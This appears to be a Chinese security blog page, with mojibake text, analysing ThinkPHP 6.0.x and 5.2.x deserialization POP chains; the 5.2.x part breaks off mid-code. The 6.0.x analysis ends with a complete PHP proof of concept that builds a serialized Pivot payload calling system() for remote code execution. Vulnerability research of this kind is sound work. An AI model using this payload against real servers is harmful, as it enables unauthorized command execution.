<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink&#x2F;think&#x3D;6.0.x-dev v6.0</span><br></pre></td></tr></table></figure>

<h3 id="æ¼æ´éªŒè¯"><a href="#æ¼æ´éªŒè¯" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h3><p><img src="https://s2.ax1x.com/2019/10/08/uhhITU.png" alt="uhhITU.png"></p>
<h3 id="åˆ†æè¿‡ç¨‹"><a href="#åˆ†æè¿‡ç¨‹" class="headerlink" title="åˆ†æè¿‡ç¨‹"></a>åˆ†æè¿‡ç¨‹</h3><p>ä»5.1çœ‹åˆ°6.0å‘ç°Thinkphpçš„æ”¹å˜è¿˜æ˜¯æœ‰ç‚¹å¤§çš„ï¼Œåœ¨5.2ä¸­å› ä¸ºåˆ æ‰äº†Requestç±»ä¸­çš„__callæ–¹æ³•å¯¼è‡´åé¢çš„é“¾éœ€è¦é‡æ–°å¯»æ‰¾ï¼Œè€Œ6.0çš„é“¾è¿˜å¯ä»¥ç»§ç»­ç”¨5.2.x __toStringåé¢çš„é“¾ï¼Œä½†æ˜¯ç”±äºThinkphp6.0åˆ æ‰äº†Windowsç±»ï¼Œæ‰€ä»¥åŸæ¥çš„Windows-&gt;__destruct()è§¦å‘ç‚¹æ²¡äº†ï¼Œéœ€è¦é‡æ–°æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„è§¦å‘ç‚¹ã€‚</p>
<p><strong>æ–°çš„è§¦å‘ç‚¹ä½äºModel.phpç±»ä¸­çš„__destruct</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;lazySave) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><strong>å°†$this-&gt;lazySaveè®¾ç½®ä¸ºTrueï¼Œè¿›å…¥save()å‡½æ•°</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">(array $data = [], string $sequence = null)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// æ•°æ®å¯¹è±¡èµ‹å€¼</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;setAttrs($data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isEmpty() || <span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeWrite'</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;exists ? <span class="keyword">$this</span>-&gt;updateData() : <span class="keyword">$this</span>-&gt;insertData($sequence);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === $result) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>

<p><strong>è¿™é‡Œæˆ‘ä»¬è¦è¿›å…¥updataDataå‡½æ•°ï¼Œæ‰€ä»¥è¦è€ƒè™‘ä¸€ä¸‹å‰é¢å‡ ä¸ªæ¡ä»¶çš„æ»¡è¶³æƒ…å†µ</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isEmpty() || <span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeWrite'</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>è·Ÿç€isEmpty()</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span><span class="params">()</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬éœ€è¦$this-&gt;dataä¸ºä¸€ä¸ªéç©ºæ•°ç»„è¿™æ ·å°±æ»¡è¶³è¿”å›æ˜¯falseäº†ï¼Œæ¥ç€è·Ÿè¿›trigger</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span><span class="params">(string $event)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;withEvent) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>

<p>æ§åˆ¶$this-&gt;withEventä¸ºFalseå°±å¯ä»¥äº†</p>
<p>å†å›åˆ°saveå‡½æ•°ä¸­çœ‹ä¸€ä¸‹ï¼Œæˆ‘ä»¬å‰é¢çš„å‡½æ•°éƒ½æ»¡è¶³äº†ï¼Œæœ€åå†è®¾$this-&gt;existsä¸ºtrueå°±å¯ä»¥è¿›å…¥updateDataå‡½æ•°äº†ï¼Œè·Ÿè¿›</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateData</span><span class="params">()</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// äº‹ä»¶å›è°ƒ</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeUpdate'</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;checkData();</span><br><span class="line">    <span class="comment">// è·å–æœ‰æ›´æ–°çš„æ•°æ®</span></span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;getChangedData();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($data)) &#123;</span><br><span class="line">        <span class="comment">// å…³è”æ›´æ–°</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;relationWrite)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;autoRelationUpdate();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line">        $allowFields = <span class="keyword">$this</span>-&gt;checkAllowFields();</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>

<p><strong>ä¸‹é¢è¿™éƒ¨åˆ†ä»£ç å·²ç»æ»¡è¶³äº†ï¼Œç›´æ¥å¾€ä¸‹èµ°</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeUpdate'</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>è·Ÿè¿›checkData()</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkData</span><span class="params">()</span>: <span class="title">void</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ä¼¼ä¹æ²¡å½±å“ï¼Œæ¥ç€è·Ÿè¿›getChangedData()</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;force ? <span class="keyword">$this</span>-&gt;data : array_udiff_assoc(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;origin, <span class="function"><span class="keyword">function</span> <span class="params">($a, $b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">empty</span>($a) || <span class="keyword">empty</span>($b)) &amp;&amp; $a !== $b) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> is_object($a) || $a != $b ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åªè¯»å­—æ®µä¸å…è®¸æ›´æ–°</span></span><br><span class="line">....</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥è®¾ç½®$this-&gt;forceä¸ºtrueï¼Œè¿™æ ·è¿”å›çš„å°±æ˜¯æˆ‘ä»¬è®¾ç½®çš„éç©ºdataæ•°ç»„äº†</p>
<p><strong>æœ€ç»ˆè¿›å…¥checkAllowFields()å‡½æ•°</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAllowFields</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// æ£€æµ‹å­—æ®µ</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;field)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;schema)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = array_keys(array_merge(<span class="keyword">$this</span>-&gt;schema, <span class="keyword">$this</span>-&gt;jsonType));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $query = <span class="keyword">$this</span>-&gt;db();</span><br><span class="line">            $table = <span class="keyword">$this</span>-&gt;table ? <span class="keyword">$this</span>-&gt;table . <span class="keyword">$this</span>-&gt;suffix : $query-&gt;getTable();</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡è®¾ç½®$this-&gt;fieldä¸ºç©ºï¼Œ$this-&gt;schemaä¸ºç©ºè¿›å…¥__toStringè§¦å‘ç‚¹db()å‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">db</span><span class="params">($scope = [])</span>: <span class="title">Query</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> Query $query */</span></span><br><span class="line">    $query = <span class="keyword">self</span>::$db-&gt;connect(<span class="keyword">$this</span>-&gt;connection)</span><br><span class="line">        -&gt;name(<span class="keyword">$this</span>-&gt;name . <span class="keyword">$this</span>-&gt;suffix)</span><br><span class="line">        -&gt;pk(<span class="keyword">$this</span>-&gt;pk);</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°æœ‰å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå°†è¿™ä¸¤ä¸ªå˜é‡éšä¾¿ä¸€ä¸ªè®¾ç½®ä¸ºæˆ‘ä»¬æƒ³è¦è§¦å‘çš„ç±»å°±å¯ä»¥è§¦å‘åé¢çš„é“¾äº†ï¼Œåé¢çš„é“¾åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¹Ÿåˆ†æè¿‡ï¼Œè¿™é‡Œå°±ä¸è¯¦ç»†åˆ†æäº†ã€‚</p>
<p>è°ƒç”¨æ ˆå¦‚ä¸‹</p>
<p><img src="https://s2.ax1x.com/2019/10/09/u5h9sI.png" alt="u5h9sI.png"></p>
<p>è¿™ä¸ªpocæ„Ÿè§‰ä¹Ÿæ˜¯å¾ˆå€¼å¾—å‚è€ƒå­¦ä¹ </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">- Created by PhpStorm.</span></span><br><span class="line"><span class="comment">- User: wh1t3P1g</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">visible</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">trait</span> RelationShip&#123;</span><br><span class="line">        <span class="keyword">private</span> $relation;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">trait</span> Attribute&#123;</span><br><span class="line">        <span class="keyword">private</span> $withAttr;</span><br><span class="line">        <span class="keyword">private</span> $data;</span><br><span class="line">        <span class="keyword">protected</span> $type;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">trait</span> ModelEvent&#123;</span><br><span class="line">        <span class="keyword">protected</span> $withEvent;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">    <span class="keyword">private</span> $lazySave;</span><br><span class="line">    <span class="keyword">private</span> $exists;</span><br><span class="line">    <span class="keyword">private</span> $force;</span><br><span class="line">    <span class="keyword">protected</span> $connection;</span><br><span class="line">    <span class="keyword">protected</span> $suffix;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($obj)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($obj == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = <span class="keyword">array</span>(<span class="string">"wh1t3p1g"</span>=&gt;<span class="string">"calc.exe"</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;relation = <span class="keyword">array</span>(<span class="string">"wh1t3p1g"</span>=&gt;[]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;visible= <span class="keyword">array</span>(<span class="string">"wh1t3p1g"</span>=&gt;[]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr = <span class="keyword">array</span>(<span class="string">"wh1t3p1g"</span>=&gt;<span class="string">"system"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withEvent = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exists = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;force = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = <span class="keyword">array</span>(<span class="string">"wh1t3p1g"</span>=&gt;<span class="string">"calc.exe"</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = <span class="string">"mysql"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;suffix = $obj;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Pivot</span> <span class="title">extends</span> \<span class="title">think</span>\<span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">function</span> <span class="title">__construct</span>($<span class="title">obj</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title">parent</span>::<span class="title">__construct</span>($<span class="title">obj</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">pivot1</span> = <span class="title">new</span> \<span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>(<span class="title">null</span>);</span><br><span class="line">    $pivot2 = <span class="keyword">new</span> \think\model\Pivot($pivot1);</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize($pivot2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><p><a href="https://www.anquanke.com/post/id/187819#h2-6" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187819#h2-6</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/10/09/Thinkphp-6-0-x-pop%E9%93%BE%E5%88%86%E6%9E%90/" data-id="ckabsu38r002fkkvrayr0f28g" class="article-share-link" data-share="baidu" data-title="Thinkphp 6.0.x popé“¾åˆ†æ">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/09/Thinkphp-6-0-x-pop%E9%93%BE%E5%88%86%E6%9E%90/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Webå®‰å…¨</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Thinkphp-5-2-x-popé“¾åˆ†æ" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/08/Thinkphp-5-2-x-pop%E9%93%BE%E5%88%86%E6%9E%90/" class="article-date">
  <time datetime="2019-10-08T12:34:35.000Z" itemprop="datePublished">2019-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/08/Thinkphp-5-2-x-pop%E9%93%BE%E5%88%86%E6%9E%90/">Thinkphp 5.2.x popé“¾åˆ†æ</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>ç´§æ¥ç€ç¬¬ä¸€ç¯‡5.1.xçš„popé“¾åˆ†æï¼Œæ¥ä¸‹æ¥åˆ†æç¬¬äºŒç¯‡5.2.xçš„popé“¾</p>
<h3 id="æ¼æ´éªŒè¯"><a href="#æ¼æ´éªŒè¯" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h3><p><img src="https://s2.ax1x.com/2019/10/08/ufH5Se.png" alt="ufH5Se.png"></p>
<h3 id="åˆ†ææµç¨‹"><a href="#åˆ†ææµç¨‹" class="headerlink" title="åˆ†ææµç¨‹"></a>åˆ†ææµç¨‹</h3><p>Thinkphp5.2å’ŒThinkphp5.1çš„åŒºåˆ«æ˜¯ï¼š</p>
<p>åœ¨tp5.1ä¸­æˆ‘ä»¬å¯ä»¥è§¦å‘Requestç±»ä¸­çš„__callæ–¹æ³•è¿›è€Œè§¦å‘call_user_func_arrayè°ƒç”¨inputæ–¹æ³•ï¼Œè¿›è€Œè°ƒç”¨filtervalueï¼Œé…åˆè‡ªå·±è®¾ç½®çš„$this-&gt;filterè¿›è¡Œcall_user_func å®ç° RCE.</p>
<p>é‚£ä¹ˆåœ¨Thinkphp5.2ä¸­Requestç±»æ˜¯è¢«åˆ é™¤æ‰äº†ï¼Œæ‰€ä»¥åé¢çš„é“¾æ˜¯ä¸å¯ç”¨çš„ï¼Œä¸è¿‡å‰é¢åˆ°file_exitsè§¦å‘__toStringè¿˜æ˜¯å¯ä»¥ç”¨çš„ï¼Œé‚£ä¹ˆå‰é¢çš„å°±file_existsä¹‹å‰å°±ä¸å†è¯¦ç»†åˆ†æäº†ï¼Œä¸»è¦åˆ†æä¸‹è§¦å‘__toStringåçš„è°ƒç”¨æµç¨‹</p>
<p>åœ¨thinkphp5.1ä¸­æ˜¯é€šè¿‡visiableå‡½æ•°å»è§¦å‘__call,é‚£ä¹ˆRequestç±»ä¸­çš„__callè¢«åˆ äº†ï¼Œè‡ªç„¶è¿™ä¸ªè§¦å‘ç‚¹ä¹Ÿå°±æ²¡ä½œç”¨äº†ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥å¯»æ‰¾æ–°çš„è§¦å‘ç‚¹</p>
<p><strong>åŒæ ·åœ¨toArray()å‡½æ•°ä¸­</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$data = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Model || $val <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">        <span class="comment">// å…³è”æ¨¡å‹å¯¹è±¡</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">            $val-&gt;visible(<span class="keyword">$this</span>-&gt;visible[$key]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key])) &#123;</span><br><span class="line">            $val-&gt;hidden(<span class="keyword">$this</span>-&gt;hidden[$key]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å…³è”æ¨¡å‹å¯¹è±¡</span></span><br><span class="line">        $item[$key] = $val-&gt;toArray();</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">        $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;</span><br><span class="line">        $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>è§¦å‘ç‚¹åœ¨getAttr()å‡½æ•°</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;</span><br><span class="line">            $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br></pre></td></tr></table></figure>

<p><strong>è·Ÿè¿›getAttr()å‡½æ•°</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">(string $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $relation = <span class="keyword">false</span>;</span><br><span class="line">        $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">        $relation = <span class="keyword">true</span>;</span><br><span class="line">   